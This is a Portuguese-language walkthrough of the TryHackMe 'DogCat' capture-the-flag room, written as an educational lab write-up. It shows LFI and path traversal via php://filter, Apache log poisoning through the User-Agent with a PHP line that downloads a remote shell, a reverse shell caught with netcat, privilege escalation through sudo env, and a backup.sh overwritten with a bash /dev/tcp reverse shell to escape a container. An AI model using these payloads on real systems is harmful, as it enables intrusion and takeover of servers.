# TryHackMe - DogCat

**Índice**

Lista de verificação:

- [ ]  Iniciar VPN TryHackMe
- [ ]  Varredura de Portas com “nmap -A [IP]”.
- [ ]  Verificar código-fonte da página.
- [ ]  Verificar se PHP está em execução.
- [ ]  Verificar a necessidade de encodar URL para RCE ou LFI
- [ ]  Verificar requisições no BurpSuite

## Sobre

Resolução da Room DogCat - TryHackMe.

## Informações

[https://tryhackme.com/room/dogcat](https://tryhackme.com/room/dogcat)

## Execução

Iniciamos um PortScan com `nmap -A [IP]` no HOST:

![Captura de tela de 2023-06-28 21-03-29.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F169bdeda-d689-4b77-a7d6-cb9103324a11%2FCaptura_de_tela_de_2023-06-28_21-03-29.png?table=block&id=66e67b11-e308-4770-b1d5-46bbe43a1460&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&width=1520&userId=c637e524-e130-478b-8aab-e7badc4ed67a&cache=v2)

O site contém 2 botões “**A dog”** e “**A cat**”, e o código-fonte aparentemente executa um arquivo PHP de acordo com o botão pressionado.

![Captura de tela de 2023-06-28 21-06-49.png](https://file.notion.so/f/s/822c0c84-71d3-4167-ae05-949b5d893bca/Captura_de_tela_de_2023-06-28_21-06-49.png?id=c8c28ef5-7baa-4332-a5d7-45f7bedae254&table=block&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&expirationTimestamp=1692972000000&signature=vxJZf2m2l7N7St86VxIkzABKBMvbxeQVKc9vhgSp_Gs&downloadName=Captura+de+tela+de+2023-06-28+21-06-49.png)

![Captura de tela de 2023-06-28 21-08-21.png](https://file.notion.so/f/s/913816dc-a55e-46bb-835b-98bfc645b5ad/Captura_de_tela_de_2023-06-28_21-08-21.png?id=3d4dc508-7262-4f73-be26-6e15ca6eefb4&table=block&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&expirationTimestamp=1692972000000&signature=7moQjSFfR5ZpKYrpv4HfuO_K50rGtLjfjO6gOmHrHKg&downloadName=Captura+de+tela+de+2023-06-28+21-08-21.png)

Nesse caso podemos fazer um “teste” PHP adicionando um carácter no ***`/?view=dog`***

![Captura de tela de 2023-06-28 21-11-11.png](https://file.notion.so/f/s/ea73b92c-85a6-4ccb-9f55-95f28ec670a7/Captura_de_tela_de_2023-06-28_21-11-11.png?id=e3bb71c1-6020-4e85-a28f-6c7ad482ba91&table=block&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&expirationTimestamp=1692972000000&signature=Fafoz6dAZtpHKPSgEAPVz4PJEAYXp4VMah59eHXVMAM&downloadName=Captura+de+tela+de+2023-06-28+21-11-11.png)

Como esperado ele diz não poder encontrar o arquivo ***dog*.php*** para executar a função *`include()`.*

Aqui podemos esperar um possível RCE. Podemos usar a URL para navegar e executar arquivos PHP, para teste podemos tentar fazer a mesma coisa para ***cat*** e ***index***. Nesse caso específico, “dog” é como se fosse um argumento necessário para “bypassar” a função `include()`, para depois fazermos o “parse” utilizando **`/../`**

> *No contexto da exploração de uma vulnerabilidade RCE/LFI, pode-se usar 
"http://<ip>/?view=php://filter/read=convert.base64-encode/resource=dog/../index" para contornar restrições impostas pelo site.*
> 

No caso do ***`index.php` ,***durante a requisição ele espera alguma constante a ser declarada.

![Captura de tela de 2023-06-28 21-23-27.png](https://file.notion.so/f/s/10819adb-773c-4b9f-85c5-8c0572132cc3/Captura_de_tela_de_2023-06-28_21-23-27.png?id=1ce05873-9af0-45ea-946c-b3b1f8c3125e&table=block&spaceId=254b86ca-c25a-482f-bb36-3ae97ba31c84&expirationTimestamp=1692972000000&signature=GWvz-qH4lcICrYvYaESIPKW6jOFKAB64rAu54k_TUYw&downloadName=Captura+de+tela+de+2023-06-28+21-23-27.png)

![Captura de tela de 2023-06-28 21-23-36.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-28_21-23-36.png)

Sabemos que conseguimos executar arquivos .php em `/var/www/html/` , sendo assim podemos tentar fazer a leitura de alguns arquivos do sistema/servidor.

Para conseguimos ter acesso a algum arquivo, temos que ter em mente a navegação via terminal por diretorios linux. Sabemos que nossa base é `?view=dog/../`  e estamos no diretório `/var/www/html/` então usamos `../../../` para irmos ao diretório raíz (/) , e a partir daí buscar nosso arquivo.

Após escolher o arquivo (aí tem que saber a localização de cabeça rs), pedimos para que seja escrito na tela com o **&ext=**  `[IP]/?view=dog/../../../../etc/passwd&ext`= .

### Porque **ext**?

Após verificar o `**dog.php**` usando filtro para imprimir o código em **BASE64** `?view=php://filter /convert.base64-encode/resource=` em `dog/../index` podemos verificar o seguinte código:

---

```php
<!DOCTYPE HTML>
<html>
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>
    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>
</html>
```

---

No trecho `$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';` podemos ver que é adicionado **.php** ao final do que estiver na string mencionada. Nesse caso ao digitar **dog&ext,** estamos querendo dizer **dog.php**

---

![Captura de tela de 2023-06-28 22-11-09.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-28_22-11-09.png)

---

Sabendo que conseguimos ler arquivos, podemos fazer um **LogPoison** ([link](https://rodolfomarianocy.medium.com/aprenda-a-fazer-log-poisoning-em-ssh-e-apache-via-lfi-65f08a2f7d1d)).

> *Trata-se de sujar logs de serviços e através de RCE e forçar uma execução e uma resposta vinda do servidor, como uma execução de código remoto que vai interpretar e executar nosso código PHP malicioso.*
> 

Em primeiro lugar, sabemos que o serviço WEB que roda neste host é um **Apache**, por padrão o diretório de logs fica localizado em `var/log/apache2/access.log` , e para acessar podemos usar `[IP]/?view=dog/../../../../../../../var/log/apache2/access.log&ext=` 

---

![Captura de tela de 2023-06-28 22-40-58.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-28_22-40-58.png)

---

Agora podemos testar o log, dando um comando qualquer em `?view=` . Neste caso digitei **ls -la** e observando o código-fonte da página, podemos ver uma nova requisição armazenada no `access.log` .

![Captura de tela de 2023-06-29 19-58-33.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_19-58-33.png)

O log armazena IP, DT/HR, o tipo de requisição, caminho, e o **UserAgent**. Aqui podemos injetar um arquivo PHP malicioso para obtermos uma SHELL Reversa. ([link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))

Após configurar devidamente o shell.php, inicio um serviço “WebHTTP” utilizando o Python3:
`sudo python3 -m http.server 80`

E utilizando o BurpSuite, altero o **UserAgent** da requisição do Access.log para o seguinte:

`<?php file_put_contents('shell.php',file_get_contents('http://[IP]/shell.php'))?>`

![Captura de tela de 2023-06-29 20-17-40.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-17-40.png)

---

Nesse momento nosso serviço Web confirma o acesso ao arquivo.

![Captura de tela de 2023-06-29 20-38-22.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-38-22.png)

Agora é só obter a Shell Reversa com o host. Podemos fazer isso usando o NetCat: 

`nc -nlvp 5555`

E pronto! Temos acesso ao Host com sucesso!

![Captura de tela de 2023-06-29 20-40-28.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-40-28.png)

Utilizando o comando `find / -name **flag** 2>/dev/null` , podemos começar a encontrar as Flags.

![Captura de tela de 2023-06-29 20-47-12.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-47-12.png)

Ok, agora vamos ver o que nosso usuário pode executar …

![Captura de tela de 2023-06-29 20-50-26.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-50-26.png)

Ótimo! podemos executar o env como superusuario sem a necessidade de senha. Para facilitar, podemos acessar o GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) para pesquisar os comandos.

![Captura de tela de 2023-06-29 20-52-39.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-52-39.png)

---

![Captura de tela de 2023-06-29 20-53-37.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_20-53-37.png)

Finalmente! Como ROOT tudo fica mais fácil. Agora podemos terminar nossa ROOM encontrando as FLAGS restantes usando o mesmo comando que antes (`find / -name **flag** 2>/dev/null`), só que agora como ROOT.

### E a Flag4?!

Boa pergunta rs

Precisei colar de um Walkthrough do canal “[Optional](https://www.youtube.com/watch?v=zGDbi15Jkqw)” no YouTube, e lá ele mostra um arquivo em `/opt/backups/backup.tar`

Pelo que entendi esse é um container Docker. E pela última modificação do arquivo, ele deve ser executado frequentemente. Então seguindo os passos do “Optional”, como ROOT, sobrescrevi o `backup.sh` usando o comando echo e tive que aguardar uns minutinhos:

`echo -e "#!/bin/bash\nbash -i >& /dev/tcp/10.13.5.224/5555 0>&1" > backup.sh`

![Captura de tela de 2023-06-29 21-25-30.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_21-25-30.png)

---

E por fim a Flag4 !

---

![Captura de tela de 2023-06-29 21-26-07.png](TryHackMe%20-%20DogCat%20eafaeda6ff944b2c8408269d0b76c9a4/Captura_de_tela_de_2023-06-29_21-26-07.png)

---

Obrigado por ler, espero que tenha aprendido alguma coisa :)
